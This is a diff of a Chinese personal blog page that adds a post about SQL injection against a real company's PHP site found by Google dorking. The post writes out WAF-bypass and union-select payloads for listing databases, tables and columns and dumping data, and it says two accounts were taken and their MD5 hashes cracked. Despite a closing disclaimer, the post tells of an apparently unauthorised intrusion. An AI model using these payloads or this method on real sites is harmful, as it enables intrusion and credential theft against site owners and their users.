@@ -1,23 +1,24 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
-    <head>
-	<meta name="generator" content="Hugo 0.134.2"><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="演示说明">
-<title>gucheNg</title>
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="发现方式 利用goole语法inurl=&quot;id=&quot;发现某公司php站点，在id后输入1' and 'a'='a'--显示被waf拦截\n这个waf我去搜了一下是西数的一个waf，挺拉的\n">
+<title>记一次真实站点sql注入漏洞</title>
 
-<link rel='canonical' href='http://gucheng.me/'>
+<link rel='canonical' href='http://gucheng.me/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%AB%99%E7%82%B9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/'>
 
-<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="gucheNg">
-<meta property='og:description' content="演示说明">
-<meta property='og:url' content='http://gucheng.me/'>
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="记一次真实站点sql注入漏洞">
+<meta property='og:description' content="发现方式 利用goole语法inurl=&quot;id=&quot;发现某公司php站点，在id后输入1' and 'a'='a'--显示被waf拦截\n这个waf我去搜了一下是西数的一个waf，挺拉的\n">
+<meta property='og:url' content='http://gucheng.me/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%AB%99%E7%82%B9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/'>
 <meta property='og:site_name' content='gucheNg'>
-<meta property='og:type' content='website'><meta property='og:updated_time' content=' 2024-09-11T11:34:30&#43;08:00 '/>
-<meta name="twitter:title" content="gucheNg">
-<meta name="twitter:description" content="演示说明"><link rel="alternate" type="application/rss&#43;xml" href="http://gucheng.me/index.xml">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-09-11T11:34:30&#43;08:00'/><meta property='article:modified_time' content='2024-09-11T11:34:30&#43;08:00'/>
+<meta name="twitter:title" content="记一次真实站点sql注入漏洞">
+<meta name="twitter:description" content="发现方式 利用goole语法inurl=&quot;id=&quot;发现某公司php站点，在id后输入1' and 'a'='a'--显示被waf拦截\n这个waf我去搜了一下是西数的一个waf，挺拉的\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
-    <body class="">
+    <body class="
+    article-page
+    ">
     <script>
         (function() {
             const colorSchemeKey = 'StackColorScheme';
@@ -125,7 +126,7 @@
         
         
         
-        <li  class='current' >
+        <li >
             <a href='/' >
                 
                 
@@ -253,61 +254,10 @@
     <aside class="sidebar right-sidebar sticky">
         
             
-                <form action="/search/" class="search-form widget" >
-        <p>
-            <label>搜索</label>
-            <input name="keyword" required placeholder="输入关键词..." />
-        
-            <button title="搜索">
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-            </button>
-        </p>
-    </form>
-            
-        
-            
-                <section class="widget archives">
+                
+    <section class="widget archives">
         <div class="widget-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
-</svg>
-
-
-
-        </div>
-        <h2 class="widget-title section-title">归档</h2>
-
-        
-        
-        
-        
-        
-        <div class="widget-archive--list">
-            <div class="archives-year">
-                    <a href="/archives/#2024">
-                        
-                            <span class="year">2024</span>
-                            <span class="count">2</span>
-                        
-                    </a> 
-                </div>
-            
-        </div>
-    </section>
-            
-        
-            
-                <section class="widget tagCloud">
-    <div class="widget-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
   <line x1="5" y1="9" x2="19" y2="9" />
   <line x1="5" y1="15" x2="19" y2="15" />
@@ -317,13 +267,28 @@
 
 
 
-    </div>
-    <h2 class="widget-title section-title">分类</h2>
-
-    <div class="tagCloud-tags">
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
         
-    </div>
-</section>
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#发现方式">发现方式</a></li>
+        <li><a href="#基本信息">基本信息</a></li>
+        <li><a href="#查库">查库</a></li>
+        <li><a href="#查表">查表</a></li>
+        <li><a href="#查列名">查列名</a></li>
+        <li><a href="#查数据">查数据</a></li>
+        <li><a href="#成果">成果</a></li>
+        <li><a href="#免责声明">免责声明：</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
 
             
         
@@ -331,15 +296,7 @@
 
 
             <main class="main full-width">
-    
-    
-    
-    
-
-    <section class="article-list">
-        
-            
-<article class="">
+    <article class="main-article">
     <header class="article-header">
 
     <div class="article-details">
@@ -381,55 +338,167 @@
 </div>
 
 </header>
-</article>
-        
-            
-<article class="">
-    <header class="article-header">
 
-    <div class="article-details">
-    
-
-    <div class="article-title-wrapper">
-        <h2 class="article-title">
-            <a href="/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-misc-wp/">BaseCTF招新赛-Misc-wp</a>
-        </h2>
-    
-        
-    </div>
-
+    <section class="article-content">
     
     
-    
-    
-    <footer class="article-time">
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
-  <circle cx="18" cy="18" r="4" />
-  <path d="M15 3v4" />
-  <path d="M7 3v4" />
-  <path d="M3 11h16" />
-  <path d="M18 16.496v1.504l1 1" />
-</svg>
-                <time class="article-time--published">2024-09-10</time>
-            </div>
-        
-
-        
-    </footer>
-    
-
-    
+    <h3 id="发现方式">发现方式
+</h3><p>利用goole语法<code>inurl=&quot;id=&quot;</code>发现某公司php站点，在id后输入<code>1' and 'a'='a'--</code>显示被waf拦截</p>
+<p><img src="C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911115620840.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240911115620840"
+	
+	
+></p>
+<p>这个waf我去搜了一下是西数的一个waf，挺拉的</p>
+<p>经过尝试发现是空格被过滤了，于是将空格用+替换。输入<code>1'+and+'a'='a'--</code>后页面报错，说明存在sql注入漏洞</p>
+<p><img src="C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911115215785.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240911115215785"
+	
+	
+></p>
+<hr>
+<h3 id="基本信息">基本信息
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">	?id=1+union+select+database()--
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	?id=1+union+select+version()--
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	?id=1+union+select+user()--
+</span></span></code></pre></td></tr></table>
 </div>
+</div><ul>
+<li>成功查询到当前库名：sanying</li>
+<li>mysql版本：5.7.43</li>
+<li>user：<a class="link" href="mailto:sanying@127.0.0.1" >sanying@127.0.0.1</a></li>
+</ul>
+<p>这个版本是好多年前的了，高版本的用法不能在这用</p>
+<h3 id="查库">查库
+</h3><p>在构造的时候又发现这个waf规则里面<strong>group_concat不能和括号连用</strong>，所以我们只能用limit一条一条查</p>
+<p>构造payload</p>
+<p><code>?id=-1+union+select+schema_name+from+information_schema.schemata+limit+0,1--</code></p>
+<p>发现只有两个库，其中一个还是系统库(°ー°〃)</p>
+<p><img src="C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911121133922.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240911121133922"
+	
+	
+></p>
+<p><img src="C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911121150852.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240911121150852"
+	
+	
+></p>
+<p>看来只用脱sanying库就行了，系统库就不管了</p>
+<hr>
+<h3 id="查表">查表
+</h3><p>构造payload</p>
+<p><code>?id=-1+union+select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1--</code></p>
+<p><img src="C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911121503106.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240911121503106"
+	
+	
+></p>
+<p>后面可以用用burp的攻击模块或者自己写个脚本提取，我选的后者。因为前者还要自己去把表名抄下来太麻烦，我根据页面回显利用python re库和正则将回显内容提取出来即可，最后发现有共<strong>17</strong>张表</p>
+<hr>
+<h3 id="查列名">查列名
+</h3><p>查列名的时候又发现不能指定数据库或者具体的表名来查，反正我们只脱一个库数据库名就可以一直用database(),表名就用子查询+limit n,1来指定，后续把n当作循环变量即可</p>
+<p>构造payload</p>
+<p><code>?id=-1+union+select+column_name+from+information_schema.columns+where+table_name=(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+n,1)+and+table_schema=database()+limit+0,1--</code></p>
+<p>然后写入脚本自动化查询每张表的列名</p>
+<p><img src="C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911122645544.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240911122645544"
+	
+	
+></p>
+<hr>
+<h3 id="查数据">查数据
+</h3><p>到这里了开始我是想尽办法构造出列名，结果最后发现可以直接指定列名来查，不知道为什么，这个waf给我人整麻了 ╮(╯▽╰)╭</p>
+<p>构造payload</p>
+<p><code>-1+union+select+{data[i]}+from+Sanying.{km}</code></p>
+<p>这里是从脚本里面复制出来的，我是先把列名处理成列表</p>
+<p>这里因为不太会协调这些数据的位置处理输出到xlsx，有些列还是空的，所以我只能半自动化手动填数据到excel，有大佬的话浇浇我！</p>
+<p><img src="C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911123931868.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240911123931868"
+	
+	
+></p>
+<h3 id="成果">成果
+</h3><p>最后就是这样，拿到了两个账号和一些信息，这库也是真的老了，十几年前的了，密码还是用的md5，但是最近又有人登录。后面利用hashcat和在线网站成功解出两个md5哈希，也算是稍有收获！</p>
+<p>![68c8be9ac6e92351d64af7ad05e237be](C:\Users\天\Documents\Tencent Files\2477231995\nt_qq\nt_data\Pic\2024-09\Ori\68c8be9ac6e92351d64af7ad05e237be.png)</p>
+<h3 id="免责声明">免责声明：
+</h3><p>目的：本文旨在分享有关网络安全渗透知识的信息，以促进对网络安全的理解和提高个人和组织的安全意识。这些知识和技术应仅用于合法的、授权的安全测试和红队操作，并遵守适用的法律和道德规范。</p>
+<p>法律合规：在参考本文所提供的渗透测试和攻击技术时，请确保遵守您所在国家或地区的法律法规。未经合法授权和明确许可，禁止使用这些知识和技术从事非法活动，如未经授权的入侵、数据盗取、破坏性攻击等。</p>
+<p>责任限制：使用本文所提供的信息和技术的过程中，如因操作不当或其他原因导致任何损失或损害，作者概不负责。使用者应自行承担所有风险和后果。</p>
+<p>免责声明：本文的分享仅为技术交流和学习之用，并不鼓励任何非法活动。作者不对任何个人或组织的非法行为承担任何责任。</p>
+<p>出事与作者无关：使用者在运用本文提供的知识和技术时，应自行判断和承担责任。如因使用者违反法律法规或滥用本文提供的知识和技术而导致任何问题、损失或法律责任，与作者无关。使用者应对其行为负完全责任。</p>
+<p>合法授权：在进行安全测试和渗透测试时，使用者应首先获得相关系统和网络的合法授权，确保测试的对象是属于您合法所有或得到明确授权的。</p>
+<p>持续学习：网络安全是一个不断发展和演变的领域，本文提供的知识和技术可能随时间而过时或失效。使用者应不断学习和更新知识，关注最新的安全趋势、漏洞和防护措施。</p>
+<p>通过阅读和使用本文提供的信息和技术，视为您理解并同意以上免责声明，并同意自行承担使用这些知识和技术所产生的风险和后果。作者对任何不当使用所导致的问题、损失或法律责任概不负责。</p>
 
-</header>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
 </article>
+
+    
+
+    
+
+     
+    
         
-    </section>
-<footer class="site-footer">
+    
+
+    <footer class="site-footer">
     <section class="copyright">
         &copy; 
         
@@ -441,6 +510,85 @@
         主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.27.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
     </section>
 </footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
 
             </main>
         </div>
